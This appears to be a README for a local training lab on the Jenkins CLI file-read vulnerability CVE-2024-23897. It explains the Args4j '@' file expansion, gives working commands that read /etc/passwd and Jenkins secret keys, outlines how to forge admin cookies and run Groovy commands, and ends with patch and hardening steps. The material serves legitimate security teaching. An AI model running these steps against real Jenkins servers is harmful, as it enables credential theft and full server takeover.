# Jenkins Controller CLI Arbitrary File Read & Groovy RCE (CVE-2024-23897)

## Overview

CVE-2024-23897 is a critical vulnerability affecting the Jenkins automation server (versions $\le 2.441$ and LTS $\le 2.426.2$). With a CVSS 9.8 Critical rating, this vulnerability stems from an insecure default feature in the **Args4j command-line parsing library** integrated into the Jenkins built-in CLI interface.

Args4j by default parses command-line arguments that begin with the `@` character followed by a file path by replacing the argument with the complete text content of that file on the server. Because Jenkins exposed its CLI over HTTP WebSocket/POST endpoints without disabling this feature, unauthenticated attackers could read arbitrary files on the Jenkins controller. Depending on permissions, reading sensitive master secrets, remember-me cookies, or SSH credentials enables attackers to forge administrator sessions and execute arbitrary Groovy scripts for full Remote Code Execution (RCE).

- **Web Dashboard**: `http://localhost:8122`
- **Agent JNLP Port**: `50000`
- **Docker Shortcut**: `./lab start jenkins-cve`
- **Container Name**: `cyberlab_04_jenkins_cve`
- **RAM Footprint**: ~750 MB (OpenJDK 17 + Jenkins Controller)

---

## Architecture & Vulnerability Mechanism

```
+-------------------------------------------------------------+
|                Attacker Machine (Python / CLI jar)          |
+-------------------------------------------------------------+
                               |
                   POST /cli?remoting=false HTTP/1.1
                   WebSocket / Bi-directional Channel
                   Command: help @/etc/passwd
                               v
+-------------------------------------------------------------+
|                     Jenkins Controller CLI                  |
|                                                             |
|  1. Args4j parser receives argument: '@' + '/etc/passwd'    |
|  2. Library opens /etc/passwd and reads all lines           |
|  3. Passes contents as argument list to CLI command 'help'   |
|  4. CLI returns error: "Too many arguments: root:x:0:0:..."  |
|                                                             |
|  [Result: Arbitrary Server File Content Leaked in Error]    |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Downloading the Jenkins CLI Jar
Jenkins distributes its official CLI client directly from the running web interface:
```bash
wget http://localhost:8122/jnlpJars/jenkins-cli.jar -O /tmp/jenkins-cli.jar
```

### 2. Arbitrary File Read via CLI Argument Expansion
Target commands that reflect error messages or help output, such as `help`, `connect-node`, or `reload-job`:

```bash
# Read /etc/passwd on the Jenkins controller
java -jar /tmp/jenkins-cli.jar -s http://localhost:8122/ help '@/etc/passwd'

# Read /etc/hosts or /etc/issue
java -jar /tmp/jenkins-cli.jar -s http://localhost:8122/ help '@/etc/hosts'
```

The error message emitted by Jenkins will reflect lines from the requested file.

### 3. Escalating from Arbitrary File Read to RCE
In environments where Overall/Read permission is granted to anonymous users (or with captured low-privilege credentials), attackers can read sensitive cryptographic keys:
1. Read `/var/jenkins_home/secrets/master.key` and `/var/jenkins_home/secrets/hudson.util.Secret`.
2. Decrypt stored credentials or forge administrative remember-me cookies (`remember-me` tokens).
3. Access the Jenkins Groovy Script Console (`http://localhost:8122/script`) to run arbitrary system commands:
   ```groovy
   def proc = "id".execute()
   println proc.text
   ```

---

## Defensive Remediation & Hardening

1. **Upgrade Jenkins**:
   Upgrade Jenkins to version 2.442 or LTS 2.426.3 or newer. The patch explicitly disables the `@` file expansion feature by setting:
   ```java
   parser.setAtSyntax(false);
   ```
2. **Disable the CLI**:
   If CLI functionality is not required, disable the CLI access endpoint by evaluating in the Groovy console:
   ```groovy
   jenkins.model.Jenkins.instance.injector.getInstance(hudson.cli.CLIAction.class).setEnabled(false)
   ```

---

## Video Walkthroughs & Technical References

- [Playing with Jenkins File Read [CVE-2024-23897]](https://www.youtube.com/watch?v=toPJhfy-wvw)
- [Exploiting Jenkins CVE-2024-23897: Remote Code Execution](https://www.youtube.com/watch?v=DYu8u6N4QNM)
- [Jenkins Security Advisory 2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/)
- [Vulhub Jenkins CVE-2024-23897 Advisory](https://vulhub.org/#/environments/jenkins/CVE-2024-23897/)
